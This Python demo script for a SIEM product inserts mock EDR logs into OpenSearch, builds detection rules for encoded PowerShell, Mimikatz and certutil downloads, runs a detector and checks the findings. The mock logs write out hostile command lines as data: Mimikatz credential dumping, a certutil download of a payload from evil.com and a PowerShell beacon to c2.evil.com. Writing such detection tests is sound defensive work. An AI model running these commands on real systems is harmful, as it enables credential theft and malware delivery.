#!/usr/bin/env python3
"""
E2E 탐지 데모 스크립트
목업 로그 삽입 → Custom 규칙 생성 → Detector 생성 → 탐지 실행 → Finding 확인

사용법:
    cd backend
    python scripts/demo_e2e_detection.py
"""

import asyncio
import json
import logging
import os
import sys
import uuid
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.core.opensearch import get_opensearch_client

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

RULES_INDEX = "cs_detection_rules"
DETECTORS_INDEX = "cs_detection_policies"
FINDINGS_INDEX = "cs_detection_events"
LOGS_INDEX = "logs-sentinel_one.edr"

DEMO_TAG = "demo-e2e"


def get_client():
    return get_opensearch_client()


# ── Step 1: 목업 악성 로그 삽입 ──────────────────────────────────────────────

def insert_mock_logs(client):
    """실제 SentinelOne EDR 포맷의 의심스러운 로그를 삽입"""
    now = datetime.now(timezone.utc)
    base_ts = now - timedelta(minutes=5)

    mock_logs = [
        {
            "@timestamp": (base_ts + timedelta(seconds=10)).isoformat(),
            "demo_tag": DEMO_TAG,
            "endpoint": {"name": "DESKTOP-DEMO01", "os": "Windows 11 Pro", "type": "desktop"},
            "event": {"type": "Process Creation", "category": "process"},
            "src": {
                "process": {
                    "name": "powershell.exe",
                    "cmdline": "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",
                    "pid": 4444,
                    "user": "admin",
                    "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                    "parent": {"name": "cmd.exe", "cmdline": "cmd.exe /c start powershell"},
                    "signedStatus": "signed",
                    "integrityLevel": "high",
                }
            },
        },
        {
            "@timestamp": (base_ts + timedelta(seconds=30)).isoformat(),
            "demo_tag": DEMO_TAG,
            "endpoint": {"name": "DESKTOP-DEMO01", "os": "Windows 11 Pro", "type": "desktop"},
            "event": {"type": "Process Creation", "category": "process"},
            "src": {
                "process": {
                    "name": "mimikatz.exe",
                    "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                    "pid": 5555,
                    "user": "admin",
                    "image": {"path": "C:\\Users\\admin\\Downloads\\mimikatz.exe"},
                    "parent": {"name": "powershell.exe", "cmdline": "powershell.exe"},
                    "signedStatus": "unsigned",
                    "integrityLevel": "high",
                }
            },
        },
        {
            "@timestamp": (base_ts + timedelta(seconds=45)).isoformat(),
            "demo_tag": DEMO_TAG,
            "endpoint": {"name": "SERVER-DEMO02", "os": "Windows Server 2019", "type": "server"},
            "event": {"type": "Process Creation", "category": "process"},
            "src": {
                "process": {
                    "name": "certutil.exe",
                    "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
                    "pid": 6666,
                    "user": "SYSTEM",
                    "image": {"path": "C:\\Windows\\System32\\certutil.exe"},
                    "parent": {"name": "cmd.exe", "cmdline": "cmd.exe /c certutil"},
                    "signedStatus": "signed",
                    "integrityLevel": "system",
                }
            },
        },
        {
            "@timestamp": (base_ts + timedelta(seconds=60)).isoformat(),
            "demo_tag": DEMO_TAG,
            "endpoint": {"name": "DESKTOP-DEMO01", "os": "Windows 11 Pro", "type": "desktop"},
            "event": {"type": "Process Creation", "category": "process"},
            "src": {
                "process": {
                    "name": "whoami.exe",
                    "cmdline": "whoami /priv",
                    "pid": 7777,
                    "user": "admin",
                    "image": {"path": "C:\\Windows\\System32\\whoami.exe"},
                    "parent": {"name": "powershell.exe", "cmdline": "powershell.exe"},
                    "signedStatus": "signed",
                    "integrityLevel": "medium",
                }
            },
        },
        {
            "@timestamp": (base_ts + timedelta(seconds=90)).isoformat(),
            "demo_tag": DEMO_TAG,
            "endpoint": {"name": "DESKTOP-DEMO01", "os": "Windows 11 Pro", "type": "desktop"},
            "event": {"type": "DNS Query", "category": "dns"},
            "src": {
                "process": {
                    "name": "powershell.exe",
                    "cmdline": "powershell.exe Invoke-WebRequest http://c2.evil.com/beacon",
                    "pid": 4444,
                    "user": "admin",
                    "image": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                    "signedStatus": "signed",
                }
            },
            "dst": {"address": {"value": "c2.evil.com"}},
        },
    ]

    logger.info(f"=== Step 1: 목업 악성 로그 {len(mock_logs)}건 삽입 ===")
    inserted = 0
    for log in mock_logs:
        try:
            client.index(index=LOGS_INDEX, body=log, refresh=False)
            inserted += 1
            logger.info(f"  ✓ [{log['src']['process']['name']}] {log['src']['process']['cmdline'][:60]}...")
        except Exception as e:
            logger.error(f"  ✗ 로그 삽입 실패: {e}")

    client.indices.refresh(index=LOGS_INDEX)
    logger.info(f"  → {inserted}건 삽입 완료\n")
    return inserted


# ── Step 2: Custom 탐지 규칙 생성 ─────────────────────────────────────────

def create_custom_rules(client):
    """목업 로그를 탐지하는 Custom 규칙 생성"""
    logger.info("=== Step 2: Custom 탐지 규칙 생성 ===")
    now = datetime.now(timezone.utc).isoformat()

    rules = [
        {
            "name": "[Demo] Encoded PowerShell Execution",
            "description": "Base64 인코딩된 PowerShell 명령 실행 탐지",
            "type": "custom",
            "level_normalized": "high",
            "status": "active",
            "is_deleted": False,
            "detection_config": {
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"src.process.name": "powershell.exe"}},
                            {"wildcard": {"src.process.cmdline": "*-enc*"}},
                        ],
                        "filter": [{"term": {"demo_tag.keyword": DEMO_TAG}}],
                    }
                }
            },
            "mitre_technique_ids": ["T1059.001"],
            "mitre_tactic_ids": ["execution"],
            "tags": ["attack.execution", "demo"],
        },
        {
            "name": "[Demo] Mimikatz Credential Dumping",
            "description": "Mimikatz 실행을 통한 자격 증명 덤핑 탐지",
            "type": "custom",
            "level_normalized": "critical",
            "status": "active",
            "is_deleted": False,
            "detection_config": {
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"src.process.name": "mimikatz.exe"}},
                        ],
                        "filter": [{"term": {"demo_tag.keyword": DEMO_TAG}}],
                    }
                }
            },
            "mitre_technique_ids": ["T1003.001"],
            "mitre_tactic_ids": ["credential-access"],
            "tags": ["attack.credential_access", "demo"],
        },
        {
            "name": "[Demo] Certutil Download",
            "description": "certutil을 이용한 파일 다운로드 탐지 (LOLBin)",
            "type": "custom",
            "level_normalized": "high",
            "status": "active",
            "is_deleted": False,
            "detection_config": {
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"src.process.name": "certutil.exe"}},
                            {"wildcard": {"src.process.cmdline": "*urlcache*"}},
                        ],
                        "filter": [{"term": {"demo_tag.keyword": DEMO_TAG}}],
                    }
                }
            },
            "mitre_technique_ids": ["T1105"],
            "mitre_tactic_ids": ["command-and-control"],
            "tags": ["attack.command_and_control", "demo"],
        },
    ]

    rule_ids = []
    for rule in rules:
        doc_id = str(uuid.uuid4())
        rule.update({
            "id": doc_id,
            "revision": 1,
            "created_at": now,
            "updated_at": now,
        })
        try:
            client.index(index=RULES_INDEX, id=doc_id, body=rule, refresh=False)
            rule_ids.append(doc_id)
            logger.info(f"  ✓ {rule['name']} [{rule['level_normalized']}] → {doc_id[:8]}...")
        except Exception as e:
            logger.error(f"  ✗ 규칙 생성 실패: {e}")

    client.indices.refresh(index=RULES_INDEX)
    logger.info(f"  → {len(rule_ids)}개 규칙 생성 완료\n")
    return rule_ids


# ── Step 3: Detector 생성 ────────────────────────────────────────────────

def create_detector(client, rule_ids):
    """규칙들을 연결한 Detector 생성"""
    logger.info("=== Step 3: Detector 생성 ===")
    now = datetime.now(timezone.utc).isoformat()

    detector_id = str(uuid.uuid4())
    detector = {
        "id": detector_id,
        "name": "[Demo] 공격 행위 탐지 Detector",
        "description": "E2E 데모: 인코딩 PowerShell + Mimikatz + Certutil 다운로드",
        "detector_type": "windows",
        "target_indices": [LOGS_INDEX],
        "linked_rule_ids": rule_ids,
        "field_mappings": [],
        "schedule_interval_min": 5,
        "trigger_condition": "total > 0",
        "message_template": "[{{severity}}] {{name}}: {{total}}건 탐지 — {{rule_name}}",
        "severity": "critical",
        "is_active": True,
        "timestamp_field": "@timestamp",
        "max_search_window_min": 60,
        "total_findings_count": 0,
        "created_by": "demo-script",
        "created_at": now,
        "updated_at": now,
    }

    try:
        client.index(index=DETECTORS_INDEX, id=detector_id, body=detector, refresh=True)
        logger.info(f"  ✓ Detector: {detector['name']} → {detector_id[:8]}...")
        logger.info(f"    연결 규칙: {len(rule_ids)}개")
        logger.info(f"    대상 인덱스: {LOGS_INDEX}\n")
    except Exception as e:
        logger.error(f"  ✗ Detector 생성 실패: {e}")
        return None

    return detector_id


# ── Step 4: 탐지 실행 (수동 트리거) ─────────────────────────────────────

async def run_detection(detector_id):
    """Detector를 수동으로 실행하여 탐지"""
    logger.info("=== Step 4: 탐지 실행 ===")

    from app.services.detection_policy import DetectionPolicyService
    service = DetectionPolicyService()

    detector = await service.get_detector(detector_id)
    if not detector:
        logger.error("  ✗ Detector를 찾을 수 없습니다")
        return None

    logger.info(f"  Detector: {detector['name']}")
    logger.info(f"  연결 규칙: {len(detector.get('linked_rule_ids', []))}개")
    logger.info(f"  실행 중...")

    result = await service.run_detection_for_detector(detector)

    if result:
        report = result.get("report", {})
        findings = result.get("findings", [])
        logger.info(f"  ✓ 탐지 완료!")
        logger.info(f"    실행: {report.get('executed', 0)}개 규칙")
        logger.info(f"    스킵: {report.get('skipped', 0)}개 규칙")
        logger.info(f"    실패: {report.get('failed', 0)}개 규칙")
        logger.info(f"    Finding: {len(findings)}건 생성")

        for i, f in enumerate(findings, 1):
            logger.info(f"\n    ── Finding #{i} ──")
            logger.info(f"    규칙: {f.get('rule_name', '?')}")
            logger.info(f"    심각도: {f.get('severity', '?')}")
            logger.info(f"    매칭: {f.get('matched_count', 0)}건")
            logger.info(f"    메시지: {f.get('message', '?')}")
    else:
        logger.info("  → 탐지 결과 없음 (매칭 로그 없음)\n")

    return result


# ── Step 5: Finding 확인 ────────────────────────────────────────────────

def verify_findings(client, detector_id):
    """생성된 Finding 목록을 OpenSearch에서 직접 조회"""
    logger.info("\n=== Step 5: Finding 확인 (OpenSearch 직접 조회) ===")

    result = client.search(
        index=FINDINGS_INDEX,
        body={
            "query": {"term": {"detector_id.keyword": detector_id}},
            "sort": [{"created_at": {"order": "desc"}}],
            "size": 10,
        },
    )

    hits = result.get("hits", {}).get("hits", [])
    total = result.get("hits", {}).get("total", {}).get("value", 0)

    logger.info(f"  총 Finding: {total}건\n")

    for i, hit in enumerate(hits, 1):
        src = hit["_source"]
        logger.info(f"  [{i}] {src.get('rule_name', '?')}")
        logger.info(f"      심각도: {src.get('severity', '?')}")
        logger.info(f"      매칭: {src.get('matched_count', 0)}건")
        logger.info(f"      상태: {src.get('status', '?')}")
        logger.info(f"      메시지: {src.get('message', '?')}")
        logger.info(f"      생성: {src.get('created_at', '?')}")
        if src.get("sample_events"):
            logger.info(f"      샘플 이벤트:")
            for evt in src["sample_events"][:2]:
                proc = evt.get("src", {}).get("process", {})
                logger.info(f"        - {proc.get('name', '?')}: {(proc.get('cmdline', '?') or '?')[:80]}")
        logger.info("")

    return total


# ── Cleanup ──────────────────────────────────────────────────────────────

def cleanup(client, rule_ids, detector_id):
    """데모 데이터 정리"""
    logger.info("=== Cleanup: 데모 데이터 정리 ===")

    # 목업 로그 삭제
    try:
        r = client.delete_by_query(index=LOGS_INDEX, body={"query": {"term": {"demo_tag": DEMO_TAG}}})
        logger.info(f"  ✓ 목업 로그 {r.get('deleted', 0)}건 삭제")
    except Exception as e:
        logger.warning(f"  ⚠ 로그 삭제 실패: {e}")

    # 규칙 삭제
    for rid in rule_ids:
        try:
            client.delete(index=RULES_INDEX, id=rid)
        except Exception:
            pass
    logger.info(f"  ✓ 규칙 {len(rule_ids)}개 삭제")

    # Detector 삭제
    if detector_id:
        try:
            client.delete(index=DETECTORS_INDEX, id=detector_id)
            logger.info(f"  ✓ Detector 삭제")
        except Exception:
            pass

    # Finding 삭제
    if detector_id:
        try:
            r = client.delete_by_query(index=FINDINGS_INDEX, body={"query": {"term": {"detector_id.keyword": detector_id}}})
            logger.info(f"  ✓ Finding {r.get('deleted', 0)}건 삭제")
        except Exception as e:
            logger.warning(f"  ⚠ Finding 삭제 실패: {e}")

    for idx in [LOGS_INDEX, RULES_INDEX, DETECTORS_INDEX, FINDINGS_INDEX]:
        try:
            client.indices.refresh(index=idx)
        except Exception:
            pass

    logger.info("  → 정리 완료\n")


# ── Main ─────────────────────────────────────────────────────────────────

async def main():
    print()
    print("=" * 70)
    print("  CruxSIEM E2E 탐지 데모")
    print("  목업 로그 → Custom 규칙 → Detector → 탐지 실행 → Finding 확인")
    print("=" * 70)
    print()

    client = get_client()

    # Step 1: 목업 로그 삽입
    inserted = insert_mock_logs(client)
    if inserted == 0:
        logger.error("로그 삽입 실패. 종료합니다.")
        return

    # Step 2: Custom 규칙 생성
    rule_ids = create_custom_rules(client)
    if not rule_ids:
        logger.error("규칙 생성 실패. 종료합니다.")
        return

    # Step 3: Detector 생성
    detector_id = create_detector(client, rule_ids)
    if not detector_id:
        return

    # Step 4: 탐지 실행
    result = await run_detection(detector_id)

    # Step 5: Finding 확인
    finding_count = verify_findings(client, detector_id)

    print()
    print("=" * 70)
    if finding_count > 0:
        print(f"  ✅ 성공! {finding_count}건의 Finding이 생성되었습니다.")
        print(f"  → 브라우저에서 탐지 이벤트 메뉴에서 확인하세요!")
    else:
        print("  ⚠ Finding이 생성되지 않았습니다.")
    print("=" * 70)
    print()

    # 정리 여부 확인
    answer = input("데모 데이터를 정리하시겠습니까? (y/N): ").strip().lower()
    if answer == "y":
        cleanup(client, rule_ids, detector_id)
    else:
        print(f"\n  데모 데이터를 유지합니다.")
        print(f"  Detector ID: {detector_id}")
        print(f"  Rule IDs: {rule_ids}")
        print(f"  나중에 정리하려면 OpenSearch에서 demo_tag='{DEMO_TAG}'인 문서를 삭제하세요.\n")


if __name__ == "__main__":
    asyncio.run(main())
